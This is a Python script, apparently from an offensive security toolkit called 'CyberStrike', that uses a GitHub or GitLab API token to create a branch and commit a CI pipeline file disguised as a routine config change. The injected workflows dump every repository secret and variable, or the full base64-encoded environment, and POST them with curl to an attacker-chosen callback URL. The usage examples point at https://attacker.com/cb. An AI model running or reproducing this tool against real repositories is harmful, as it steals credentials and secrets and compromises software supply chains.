#!/usr/bin/env python3
"""
pipeline_inject.py — CI/CD Pipeline Injection

Injects exfiltration steps into GitHub Actions or GitLab CI pipeline
configurations to capture secrets and environment variables.

Part of CyberStrike offensive security platform.
"""

import argparse
import json
import os
import signal
import sys
import time
from datetime import datetime
from pathlib import Path

try:
    import requests
except ImportError:
    print("ERROR: requests required. Install: pip3 install requests", file=sys.stderr)
    sys.exit(1)

GH_API = "https://api.github.com"
STATE_FILE = str(Path.home() / ".cyberstrike" / "cipipe-state.json")


def load_state():
    try:
        with open(STATE_FILE, "r") as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {"created_resources": []}


def save_state(state):
    os.makedirs(os.path.dirname(STATE_FILE), exist_ok=True)
    with open(STATE_FILE, "w") as f:
        json.dump(state, f, indent=2, default=str)


class PipelineInjector:
    def __init__(self, args):
        self.args = args
        self.event_count = 0
        self.start_time = None
        self.running = True
        self.state = load_state()

    def signal_handler(self, signum, frame):
        self.running = False

    def print_banner(self):
        print("=" * 70)
        print("CyberStrike — CI/CD Pipeline Injection")
        print("=" * 70)
        print(f"PID:       {os.getpid()}")
        print(f"Repo:      {self.args.repo}")
        print(f"Platform:  {self.args.platform}")
        print(f"Callback:  {self.args.callback_url}")
        print(f"Output:    {'JSON' if self.args.json_output else 'text'}")
        print(f"Started:   {datetime.now().isoformat()}")
        print("=" * 70)
        print()

    def emit(self, record):
        self.event_count += 1
        if self.args.json_output:
            print(json.dumps(record, default=str), flush=True)
        else:
            action = record.get("action", "info")
            status = record.get("status", "")
            detail = record.get("detail", "")
            print(f"[{action.upper():<14}] [{status.upper():<8}] {detail}", flush=True)

    def track_resource(self, resource_type, resource_id, **extra):
        entry = {"type": resource_type, "id": resource_id, "created_at": datetime.now().isoformat()}
        entry.update(extra)
        self.state["created_resources"].append(entry)
        save_state(self.state)

    def inject_github(self):
        token = self.args.token or os.environ.get("GITHUB_TOKEN", "")
        if not token:
            self.emit({"action": "inject", "status": "failed", "detail": "GITHUB_TOKEN required"})
            return

        headers = {
            "Authorization": f"Bearer {token}",
            "Accept": "application/vnd.github+json",
            "X-GitHub-Api-Version": "2022-11-28",
        }
        repo = self.args.repo
        callback_url = self.args.callback_url

        ref_r = requests.get(f"{GH_API}/repos/{repo}/git/ref/heads/main", headers=headers, timeout=30)
        if ref_r.status_code != 200:
            ref_r = requests.get(f"{GH_API}/repos/{repo}/git/ref/heads/master", headers=headers, timeout=30)
        if ref_r.status_code != 200:
            self.emit({"action": "inject", "status": "failed", "detail": "Cannot get default branch"})
            return

        sha = ref_r.json()["object"]["sha"]
        branch = f"cs-inject-{int(time.time())}"

        br_r = requests.post(f"{GH_API}/repos/{repo}/git/refs", headers=headers, json={"ref": f"refs/heads/{branch}", "sha": sha}, timeout=30)
        if br_r.status_code not in (200, 201):
            self.emit({"action": "inject", "status": "failed", "detail": f"Create branch: HTTP {br_r.status_code}"})
            return
        self.track_resource("branch", branch, repo=repo)

        workflow = f"""name: cs-pipeline
on:
  push:
    branches: [{branch}]
  workflow_dispatch:
jobs:
  collect:
    runs-on: ubuntu-latest
    steps:
      - name: collect
        env:
          ALL_SECRETS: ${{{{ toJSON(secrets) }}}}
          ALL_VARS: ${{{{ toJSON(vars) }}}}
        run: |
          curl -s -X POST "{callback_url}" \\
            -H "Content-Type: application/json" \\
            -d "{{\\"secrets\\": $ALL_SECRETS, \\"vars\\": $ALL_VARS, \\"github\\": \\"${{{{ github.repository }}}}\\"}}"
"""

        import base64
        file_body = {
            "message": "ci: add pipeline config",
            "content": base64.b64encode(workflow.encode()).decode(),
            "branch": branch,
        }
        file_r = requests.put(f"{GH_API}/repos/{repo}/contents/.github/workflows/cs-pipeline.yml", headers=headers, json=file_body, timeout=30)
        if file_r.status_code in (200, 201):
            self.track_resource("workflow_file", ".github/workflows/cs-pipeline.yml", repo=repo, branch=branch)
            self.emit({"action": "inject", "status": "success", "detail": f"Injected workflow on branch {branch}"})
        else:
            self.emit({"action": "inject", "status": "failed", "detail": f"Create file: HTTP {file_r.status_code}"})

    def inject_gitlab(self):
        token = self.args.token or os.environ.get("GITLAB_TOKEN", "")
        gitlab_url = self.args.gitlab_url or os.environ.get("GITLAB_URL", "https://gitlab.com")
        if not token:
            self.emit({"action": "inject", "status": "failed", "detail": "GITLAB_TOKEN required"})
            return

        headers = {"Private-Token": token}
        project_id = self.args.project_id
        if not project_id:
            self.emit({"action": "inject", "status": "failed", "detail": "--project-id required for GitLab"})
            return

        callback_url = self.args.callback_url

        ci_content = f"""
stages:
  - collect

collect_secrets:
  stage: collect
  script:
    - |
      curl -s -X POST "{callback_url}" \\
        -H "Content-Type: application/json" \\
        -d '{{"project": "'$CI_PROJECT_NAME'", "env": "'$(env | base64)'"}}' || true
  only:
    - branches
"""

        import base64
        branch = f"cs-inject-{int(time.time())}"

        ref_r = requests.get(f"{gitlab_url}/api/v4/projects/{project_id}/repository/branches/main", headers=headers, timeout=30)
        if ref_r.status_code != 200:
            ref_r = requests.get(f"{gitlab_url}/api/v4/projects/{project_id}/repository/branches/master", headers=headers, timeout=30)

        if ref_r.status_code == 200:
            default_branch = ref_r.json()["name"]
        else:
            default_branch = "main"

        br_r = requests.post(f"{gitlab_url}/api/v4/projects/{project_id}/repository/branches", headers=headers, params={"branch": branch, "ref": default_branch}, timeout=30)
        if br_r.status_code in (200, 201):
            self.track_resource("gitlab_branch", branch, project_id=project_id)
        else:
            self.emit({"action": "inject", "status": "failed", "detail": f"Create branch: HTTP {br_r.status_code}"})
            return

        file_body = {
            "branch": branch,
            "content": ci_content,
            "commit_message": "ci: add pipeline config",
        }
        file_r = requests.post(f"{gitlab_url}/api/v4/projects/{project_id}/repository/files/.gitlab-ci.yml", headers=headers, json=file_body, timeout=30)
        if file_r.status_code in (200, 201):
            self.track_resource("gitlab_file", ".gitlab-ci.yml", project_id=project_id, branch=branch)
            self.emit({"action": "inject", "status": "success", "detail": f"Injected .gitlab-ci.yml on branch {branch}"})
        else:
            file_r = requests.put(f"{gitlab_url}/api/v4/projects/{project_id}/repository/files/.gitlab-ci.yml", headers=headers, json=file_body, timeout=30)
            if file_r.status_code in (200, 201):
                self.track_resource("gitlab_file", ".gitlab-ci.yml", project_id=project_id, branch=branch)
                self.emit({"action": "inject", "status": "success", "detail": f"Updated .gitlab-ci.yml on branch {branch}"})
            else:
                self.emit({"action": "inject", "status": "failed", "detail": f"Create file: HTTP {file_r.status_code}"})

    def run(self):
        self.print_banner()

        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

        self.start_time = time.monotonic()

        if self.args.platform == "github":
            self.inject_github()
        elif self.args.platform == "gitlab":
            self.inject_gitlab()
        else:
            print(f"ERROR: Unknown platform '{self.args.platform}'. Use: github|gitlab", file=sys.stderr)
            sys.exit(1)

        self.cleanup()

    def cleanup(self):
        print(f"\n--- pipeline_inject summary ---")
        print(f"Platform: {self.args.platform}")
        print(f"Records: {self.event_count}")
        if self.start_time:
            print(f"Duration: {time.monotonic() - self.start_time:.1f}s")
        print("Done.")


def main():
    parser = argparse.ArgumentParser(
        description="Inject exfiltration steps into CI/CD pipelines.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  python3 pipeline_inject.py --repo OWNER/REPO --callback-url https://attacker.com/cb\n"
            "  python3 pipeline_inject.py --platform gitlab --project-id 123 --callback-url https://attacker.com/cb\n"
        ),
    )
    parser.add_argument("--repo", type=str, default=None, help="GitHub repository (OWNER/REPO)")
    parser.add_argument("--platform", type=str, default="github", help="Platform: github|gitlab")
    parser.add_argument("--project-id", type=str, default=None, help="GitLab project ID")
    parser.add_argument("--gitlab-url", type=str, default=None, help="GitLab instance URL")
    parser.add_argument("--callback-url", type=str, required=True, help="Callback URL for exfiltration")
    parser.add_argument("--token", type=str, default=None, help="API token")
    parser.add_argument("--json-output", action="store_true", default=False, help="Output as JSON lines")
    args = parser.parse_args()

    injector = PipelineInjector(args)
    injector.run()


if __name__ == "__main__":
    main()
